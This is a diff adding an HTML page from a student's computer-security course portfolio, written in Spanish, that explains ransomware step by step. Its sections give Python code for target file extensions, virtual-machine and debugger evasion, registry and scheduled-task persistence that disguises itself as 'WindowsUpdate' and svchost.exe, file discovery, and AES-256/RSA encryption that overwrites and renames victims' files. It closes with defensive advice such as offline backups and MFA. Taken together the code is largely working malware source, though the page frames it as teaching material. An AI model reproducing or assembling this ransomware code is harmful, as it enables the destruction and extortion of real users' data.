@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Notas · Anatomía de un Ransomware</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  background: linear-gradient(180deg, #fff5f9, #ffe0ec);
+  overflow-x: hidden;
+  color: #3a1c2b;
+}
+
+.blur {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(70px);
+  opacity: 0.6;
+  z-index: 0;
+  animation: float 6s ease-in-out infinite;
+}
+
+.blur.one {
+  width: 360px;
+  height: 360px;
+  background: #ff9ac1;
+  top: -120px;
+  left: -120px;
+}
+
+.blur.two {
+  width: 300px;
+  height: 300px;
+  background: #ffb3d9;
+  bottom: -100px;
+  right: -100px;
+  animation-delay: 2s;
+}
+
+.blur.three {
+  width: 240px;
+  height: 240px;
+  background: #ffc2e1;
+  top: 40%;
+  right: 20%;
+  animation-delay: 4s;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px) scale(1); }
+  50% { transform: translateY(-20px) scale(1.05); }
+}
+
+.wrapper {
+  position: relative;
+  z-index: 1;
+  max-width: 1400px;
+  margin: 70px auto;
+  padding: 20px;
+}
+
+.card {
+  background: rgba(255,255,255,0.92);
+  backdrop-filter: blur(12px);
+  border-radius: 32px;
+  padding: 50px;
+  box-shadow: 0 40px 80px rgba(255,122,168,0.25), inset 0 1px 0 rgba(255,255,255,0.6);
+  transition: transform 0.5s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 50px 100px rgba(255,122,168,0.35);
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.header h1 {
+  font-size: 2.8rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.alias {
+  font-size: 1rem;
+  font-weight: 400;
+  color: #ff4f9a;
+}
+
+.header h2 {
+  margin-top: 12px;
+  font-size: 1.4rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.meta {
+  margin-top: 6px;
+  font-size: 0.95rem;
+  color: #6b3a52;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+nav ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 18px;
+  list-style: none;
+  margin: 40px 0;
+}
+
+nav a {
+  text-decoration: none;
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav a:hover, nav a.activo {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+nav ul li {
+  position: relative;
+}
+
+.submenu {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  background: rgba(255,255,255,0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 10px 0;
+  min-width: 200px;
+  box-shadow: 0 20px 40px rgba(255,79,154,0.3);
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(20px);
+  transition: all 0.3s ease;
+  z-index: 100;
+  list-style: none;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav ul li:hover .submenu {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(10px);
+}
+
+.submenu a {
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+.submenu a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+.titulo-actividad {
+  margin: 30px 0 25px;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  border-bottom: 5px solid #ff8fc4;
+  padding-bottom: 15px;
+}
+
+.titulo-actividad h3 {
+  font-size: 2.2rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.pdf-export {
+  display: flex;
+  justify-content: flex-end;
+  margin: 20px 0;
+}
+
+.btn-pdf {
+  background: linear-gradient(145deg, #ff4f9a, #ff2e7d);
+  border: none;
+  padding: 16px 36px;
+  border-radius: 50px;
+  color: white;
+  font-weight: 700;
+  font-size: 1.1rem;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  box-shadow: 0 15px 30px rgba(255,79,154,0.4);
+  transition: all 0.3s ease;
+  cursor: pointer;
+  border: 1px solid rgba(255,255,255,0.3);
+}
+
+.btn-pdf:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 25px 45px rgba(255,79,154,0.5);
+}
+
+.seccion {
+  background: rgba(255,255,255,0.7);
+  border-radius: 28px;
+  padding: 35px;
+  margin-top: 40px;
+  box-shadow: 0 15px 35px rgba(255,122,168,0.15);
+  border-left: 6px solid #ff4f9a;
+  transition: transform 0.3s;
+}
+
+.seccion:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 20px 45px rgba(255,79,154,0.2);
+}
+
+.seccion h4 {
+  font-size: 1.9rem;
+  color: #ff4f9a;
+  margin-bottom: 25px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 2px solid #ffe0ec;
+  padding-bottom: 12px;
+}
+
+.seccion h5 {
+  font-size: 1.4rem;
+  color: #4a2a36;
+  margin: 30px 0 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.tabla-container {
+  overflow-x: auto;
+  margin: 25px 0;
+  border-radius: 18px;
+  background: rgba(255,255,255,0.5);
+  padding: 5px;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.98rem;
+}
+
+th {
+  background: linear-gradient(145deg, #ff4f9a, #ff8fc4);
+  color: white;
+  font-weight: 600;
+  padding: 15px 12px;
+  text-align: left;
+}
+
+td {
+  padding: 14px 12px;
+  border-bottom: 1px solid #ffe0ec;
+  background: rgba(255,255,255,0.7);
+}
+
+tr:hover td {
+  background: rgba(255,225,235,0.9);
+}
+
+pre {
+  background: #2d2a2e;
+  color: #f8f8f2;
+  padding: 20px;
+  border-radius: 20px;
+  overflow-x: auto;
+  font-family: 'Courier New', monospace;
+  font-size: 0.9rem;
+  margin: 20px 0;
+  box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
+}
+
+code {
+  font-family: 'Courier New', monospace;
+}
+
+.indice-contenido {
+  background: white;
+  border-radius: 28px;
+  padding: 30px;
+  margin: 25px 0 35px;
+  box-shadow: 0 15px 35px rgba(255,122,168,0.2);
+  border-left: 6px solid #ff4f9a;
+}
+
+.indice-contenido h4 {
+  font-size: 1.8rem;
+  color: #ff4f9a;
+  margin-bottom: 20px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 2px solid #ffe0ec;
+  padding-bottom: 15px;
+}
+
+.indice-doble-columna {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px 30px;
+}
+
+.indice-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 6px 0;
+  border-bottom: 1px dotted #ffd9e6;
+}
+
+.indice-item .titulo {
+  color: #4a2a36;
+  font-weight: 500;
+}
+
+.indice-item .pagina {
+  color: #ff4f9a;
+  font-weight: 700;
+  background: #ffe0ec;
+  padding: 2px 10px;
+  border-radius: 50px;
+  font-size: 0.85rem;
+}
+
+.footer {
+  width: 100%;
+  padding: 20px 0;
+  text-align: center;
+  background: rgba(0, 0, 0, 0.35);
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  position: relative;
+  margin-top: 40px;
+}
+
+.footer-content {
+  color: #f3f3f3;
+  font-size: 14px;
+  opacity: 0.9;
+}
+
+@media (max-width: 900px) {
+  .card { padding: 30px 20px; }
+  .header h1 { font-size: 2rem; flex-direction: column; }
+  .seccion { padding: 25px; }
+  .seccion h4 { font-size: 1.6rem; }
+  .indice-doble-columna { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<div class="blur one"></div>
+<div class="blur two"></div>
+<div class="blur three"></div>
+
+<div class="wrapper">
+  <div class="card">
+
+    <!-- ========== ENCABEZADO ========= -->
+    <div class="header">
+      <h1><i class="fas fa-user-secret"></i> Laura Ivon Montelongo Martínez<span class="alias">| Alias: Ivonne</span></h1>
+      <h2><i class="fas fa-shield-alt"></i> CNO V – Seguridad Informática</h2>
+      <p class="meta"><i class="fas fa-graduation-cap"></i> ITI · Universidad Politécnica de San Luis Potosí</p>
+      <p class="meta"><i class="far fa-calendar-alt"></i> Periodo: Enero – Junio 2026</p>
+    </div>
+
+    <!-- ========== NAVEGACIÓN ========= -->
+    <nav>
+      <ul>
+        <li><a href="index.html"><i class="fas fa-home"></i> Inicio</a></li>
+        <li>
+          <a href="#"><i class="fas fa-laptop-code"></i> Actividades <i class="fas fa-chevron-down"></i></a>
+          <ul class="submenu">
+            <li><a href="actividades.html"><i class="fas fa-file-alt"></i> Primer Parcial</a></li>
+            <li><a href="segundo-parcial.html"><i class="fas fa-file-alt"></i> Segundo Parcial</a></li>
+            <li><a href="tercer-parcial.html"><i class="fas fa-file-alt"></i> Tercer Parcial</a></li>
+          </ul>
+        </li>
+        <li>
+          <a href="#"><i class="fas fa-trophy"></i> ROAD TO HALL OF FAME <i class="fas fa-chevron-down"></i></a>
+          <ul class="submenu">
+            <li><a href="road-to-hall-of-fame2.html#sql-injection"><i class="fas fa-database"></i> SQL Injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#" class="activo"><i class="fas fa-file-alt"></i> Notas</a></li>
+        <li>
+          <a href="#"><i class="fas fa-project-diagram"></i> Proyectos <i class="fas fa-chevron-down"></i></a>
+          <ul class="submenu">
+            <li><a href="PR01.html"><i class="fas fa-file-alt"></i>PR01</a></li>
+            <li><a href="PR02_01.html"><i class="fas fa-file-alt"></i>PR02</a></li>
+          </ul>
+        </li>
+        <li><a href="#"><i class="fas fa-certificate"></i> Certificaciones</a></li>
+      </ul>
+    </nav>
+
+    <!-- ========== TÍTULO PRINCIPAL ========= -->
+    <div class="titulo-actividad">
+      <h3><i class="fas fa-skull"></i> Anatomía de un Ransomware</h3>
+    </div>
+
+
+    <!-- ========== ÍNDICE DE CONTENIDO ========= -->
+    <div class="indice-contenido">
+      <h4><i class="fas fa-list-ul"></i> Contenido</h4>
+      <div class="indice-doble-columna">
+        <div>
+          <div class="indice-item"><span class="titulo">01. Punto de entrada – Librerías clave</span><span class="pagina">3</span></div>
+          <div class="indice-item"><span class="titulo">02. Configuración interna (CONFIG)</span><span class="pagina">4</span></div>
+          <div class="indice-item"><span class="titulo">03. Validación del entorno</span><span class="pagina">5</span></div>
+          <div class="indice-item"><span class="titulo">04. Persistencia</span><span class="pagina">6</span></div>
+          <div class="indice-item"><span class="titulo">05. Descubrimiento de archivos</span><span class="pagina">7</span></div>
+        </div>
+        <div>
+          <div class="indice-item"><span class="titulo">06. Preparación criptográfica</span><span class="pagina">8</span></div>
+          <div class="indice-item"><span class="titulo">07. Encripción (cifrado de archivos)</span><span class="pagina">9</span></div>
+          <div class="indice-item"><span class="titulo">08. Manejo de nombres y extensiones</span><span class="pagina">10</span></div>
+          <div class="indice-item"><span class="titulo">Reflexión técnica y consideraciones</span><span class="pagina">11</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ================= SECCIÓN 01 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-code-branch"></i> 01. Punto de entrada – Librerías clave</h4>
+      <p>Todo ransomware inicia importando módulos que le otorgan capacidades para interactuar con el sistema, cifrar archivos, comunicarse con servidores C2 y evadir análisis. La siguiente tabla muestra las librerías más comunes, su uso legítimo y el riesgo que representan en un contexto malicioso.</p>
+      <div class="tabla-container">
+        <table>
+          <thead><tr><th>Librería</th><th>Capacidad técnica</th><th>Uso legítimo</th><th>Riesgo en análisis</th></tr></thead>
+          <tbody>
+            <tr><td>os</td><td>Acceso a sistema de archivos, variables de entorno</td><td>Scripts, automatización</td><td>Enumeración de archivos, fingerprinting</td></tr>
+            <tr><td>pathlib</td><td>Manejo estructurado de rutas</td><td>Apps modernas</td><td>Recorrido de archivos objetivo</td></tr>
+            <tr><td>shutil</td><td>Copiar, mover, eliminar archivos</td><td>Backups, gestión</td><td>Persistencia, propagación</td></tr>
+            <tr><td>subprocess</td><td>Ejecutar comandos del sistema</td><td>Administración</td><td>Ejecución de comandos del SO</td></tr>
+            <tr><td>platform</td><td>Información del sistema</td><td>Diagnóstico</td><td>Detección de VM/sandbox</td></tr>
+            <tr><td>sys</td><td>Control de ejecución, argumentos</td><td>Scripts CLI</td><td>Manipulación del flujo</td></tr>
+            <tr><td>psutil</td><td>Información de procesos y sistema</td><td>Monitoreo</td><td>Enumeración de procesos (anti‑análisis)</td></tr>
+            <tr><td>time</td><td>Control de tiempo, delays</td><td>Automatización</td><td>Evasión por sleep</td></tr>
+            <tr><td>threading</td><td>Ejecución concurrente</td><td>Apps multihilo</td><td>Paralelización de acciones</td></tr>
+            <tr><td>requests</td><td>HTTP/HTTPS</td><td>APIs</td><td>Comunicación externa (C2)</td></tr>
+            <tr><td>socket</td><td>Comunicación de bajo nivel</td><td>Networking</td><td>Canales ocultos</td></tr>
+            <tr><td>urllib</td><td>Manejo de URLs</td><td>Descargas</td><td>Descarga de payloads</td></tr>
+            <tr><td>hashlib</td><td>Hashing</td><td>Seguridad</td><td>Integridad o preparación de datos</td></tr>
+            <tr><td>cryptography</td><td>Cifrado avanzado</td><td>Seguridad real</td><td>Núcleo del ransomware</td></tr>
+            <tr><td>base64</td><td>Codificación</td><td>Transporte de datos</td><td>Ofuscación de código</td></tr>
+            <tr><td>codecs</td><td>Codificación/decodificación</td><td>Texto</td><td>Ocultamiento de payload</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ================= SECCIÓN 02 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-cogs"></i> 02. Configuración interna</h4>
+      <p>Aquí se definen las extensiones objetivo, rutas excluidas, nombre de la nota de rescate y un marcador interno para identificar archivos cifrados.</p>
+      <pre><code>CONFIG = {
+    "target_extensions": [
+        ".docx", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt",
+        ".csv", ".db", ".sqlite", ".zip", ".rar", ".7z", ".bak",
+        ".backup", ".doc", ".xls", ".ppt", ".pptx", ".odt", ".ods"
+    ],
+    "excluded_paths": [
+        "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
+        "C:\\ProgramData", "C:\\Users\\All Users", "C:\\$Recycle.Bin",
+        "C:\\System Volume Information", "C:\\Boot", "/boot", "/dev",
+        "/proc", "/sys", "/etc", "/usr/bin", "/usr/sbin", "/var/log",
+        "/tmp", "/run", "/System", "/Library", "/Applications"
+    ],
+    "note_name": "READ_ME_TO_DECRYPT.txt",
+    "marker": "[ENCRYPTED_BY_RANSOMWARE]"
+}</code></pre>
+      <p><strong>Más de 20 extensiones</strong> objetivo y <strong>más de 20 rutas excluidas</strong> para evitar dañar el sistema operativo o entornos críticos.</p>
+    </div>
+
+    <!-- ================= SECCIÓN 03 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-search"></i> 03. Validación del entorno</h4>
+      <p>Función que detecta máquinas virtuales, debuggers, sandboxes (por RAM baja) y verifica privilegios de administrador. Si se detecta un entorno de análisis, el malware se detiene.</p>
+      <pre><code>import platform, sys, ctypes, psutil
+
+def check_environment():
+    # Detectar máquina virtual
+    if platform.processor() == "GenuineIntel" and "VMware" in platform.version():
+        print("VM detectada, saliendo...")
+        sys.exit(1)
+    # Detectar debugger (Windows)
+    if sys.platform == "win32" and ctypes.windll.kernel32.IsDebuggerPresent() != 0:
+        print("Debugger detectado, saliendo...")
+        sys.exit(1)
+    # Sandbox por RAM baja
+    if psutil.virtual_memory().total &lt; 2 * 1024**3:
+        print("Sandbox detectado (poca RAM), saliendo...")
+        sys.exit(1)
+    # Privilegios
+    if os.name == 'nt':
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    else:
+        is_admin = os.geteuid() == 0
+    if not is_admin:
+        print("Ejecutando sin privilegios, algunas rutas no serán accesibles")
+    return is_admin</code></pre>
+    </div>
+
+    <!-- ================= SECCIÓN 04 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-charging-station"></i> 04. Persistencia</h4>
+      <p>El ransomware se asegura de ejecutarse cada vez que el sistema se reinicia mediante la clave de registro <code>Run</code>, copiándose a <code>AppData</code> y creando una tarea programada.</p>
+      <pre><code>import shutil, subprocess, winreg
+
+def establish_persistence():
+    if sys.platform == "win32":
+        # Registro de Windows
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
+        # Copiar a AppData
+        persistent_path = os.path.join(os.environ['APPDATA'], 'svchost.exe')
+        shutil.copy2(sys.executable, persistent_path)
+        # Tarea programada diaria
+        subprocess.run(f'schtasks /create /tn "SystemCheck" /tr "{persistent_path}" /sc daily /st 09:00 /f', shell=True)</code></pre>
+    </div>
+
+    <!-- ================= SECCIÓN 05 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-folder-open"></i> 05. Descubrimiento de archivos y rutas</h4>
+      <p>Recorre recursivamente un directorio base, filtra por extensiones objetivo y excluye rutas sensibles del sistema. Retorna una lista de rutas a cifrar.</p>
+      <pre><code>from pathlib import Path
+
+def discover_files(base_path):
+    files_found = []
+    base = Path(base_path)
+    for item in base.rglob("*"):
+        if item.is_file() and item.suffix.lower() in CONFIG["target_extensions"]:
+            excluded = any(excl in str(item.parent) for excl in CONFIG["excluded_paths"])
+            if not excluded:
+                files_found.append(item)
+    return files_found</code></pre>
+    </div>
+
+    <!-- ================= SECCIÓN 06 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-key"></i> 06. Preparación criptográfica</h4>
+      <p>Genera una clave AES‑256 y un vector de inicialización (IV). Luego cifra la clave AES con una clave pública RSA (cifrado híbrido). El material cifrado se envía al servidor C2 o se guarda localmente.</p>
+      <pre><code>from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
+import os
+
+def setup_crypto():
+    aes_key = os.urandom(32)       # AES-256
+    iv = os.urandom(16)            # IV para CBC
+    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    public_key = private_key.public_key()
+    encrypted_aes_key = public_key.encrypt(
+        aes_key,
+        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+    )
+    with open("encrypted_key.bin", "wb") as f:
+        f.write(encrypted_aes_key)
+    return {"aes_key": aes_key, "iv": iv, "private_key": private_key}</code></pre>
+    </div>
+
+    <!-- ================= SECCIÓN 07 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-lock"></i> 07. Encripción (cifrado de archivos)</h4>
+      <p>Lee el archivo original, aplica padding PKCS7, lo cifra con AES‑CBC usando la clave y IV generados, sobrescribe el contenido original y finalmente renombra el archivo añadiendo <code>.encrypted</code>.</p>
+      <pre><code>def process_file(file_path, crypto_context):
+    with open(file_path, "rb") as f:
+        data = f.read()
+    cipher = Cipher(algorithms.AES(crypto_context["aes_key"]), modes.CBC(crypto_context["iv"]))
+    encryptor = cipher.encryptor()
+    pad_len = 16 - (len(data) % 16)
+    data_padded = data + bytes([pad_len] * pad_len)
+    transformed_data = encryptor.update(data_padded) + encryptor.finalize()
+    with open(file_path, "wb") as f:
+        f.write(transformed_data)
+    new_path = file_path.with_suffix(file_path.suffix + ".encrypted")
+    file_path.rename(new_path)</code></pre>
+    </div>
+
+    <!-- ================= SECCIÓN 08 ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-i-cursor"></i> 08. Manejo de nombres y extensiones</h4>
+      <p>Función auxiliar que agrega una extensión personalizada (por ejemplo <code>.crypted</code>) al nombre del archivo, dejando clara evidencia del ataque.</p>
+      <pre><code>def rename_artifact(file_path):
+    new_name = str(file_path) + ".crypted"
+    os.rename(file_path, new_name)
+    return new_name</code></pre>
+      <p>En el código de cifrado ya se realiza un renombrado a <code>.encrypted</code>, esta función sirve como ejemplo de una modificación adicional.</p>
+    </div>
+
+    <!-- ================= REFLEXIÓN FINAL ================= -->
+    <div class="seccion">
+      <h4><i class="fas fa-graduation-cap"></i> Reflexión técnica y consideraciones</h4>
+      <p>El análisis de la anatomía de un ransomware muestra que, aunque el cifrado asimétrico o híbrido parece complejo, el verdadero punto débil suele ser la ausencia de controles básicos: <strong>falta de MFA</strong>, cuentas obsoletas, <strong>segmentación TI/OT deficiente</strong> y respaldos inadecuados. Este código educativo demuestra que con librerías estándar de Python (<code>cryptography</code>, <code>os</code>, <code>pathlib</code>) se puede construir un ransomware funcional. Por ello, las organizaciones deben priorizar:</p>
+      <ul style="margin-left: 2rem; margin-top: 1rem;">
+        <li><i class="fas fa-check-circle" style="color:#ff4f9a;"></i> Autenticación multifactor en todos los accesos remotos.</li>
+        <li><i class="fas fa-check-circle" style="color:#ff4f9a;"></i> Segmentación estricta entre redes TI y OT.</li>
+        <li><i class="fas fa-check-circle" style="color:#ff4f9a;"></i> Respaldos offline (air‑gapped) probados periódicamente.</li>
+        <li><i class="fas fa-check-circle" style="color:#ff4f9a;"></i> Monitoreo continuo con detección de exfiltración de datos.</li>
+        <li><i class="fas fa-check-circle" style="color:#ff4f9a;"></i> Simulacros de ransomware para validar planes de respuesta.</li>
+      </ul>
+    </div>
+
+  </div> <!-- fin card -->
+</div> <!-- fin wrapper -->
+
+<footer class="footer">
+  <div class="footer-content">
+    <p>© 2026 <strong>Laura Ivon Montelongo Martínez</strong> · Portafolio</p>
+    <p>
+      <a href="mailto:177291@upslp.edu.mx">177291@upslp.edu.mx</a> 
+      <!-- <a href="https://github.com/livtech" target="_blank" rel="noopener">GitHub</a>-->
+    </p>
+    <p>
+      Sitio seguro con certificado SSL
+    </p>
+  </div>
+</footer>
+
+
+
+</body>
+</html>
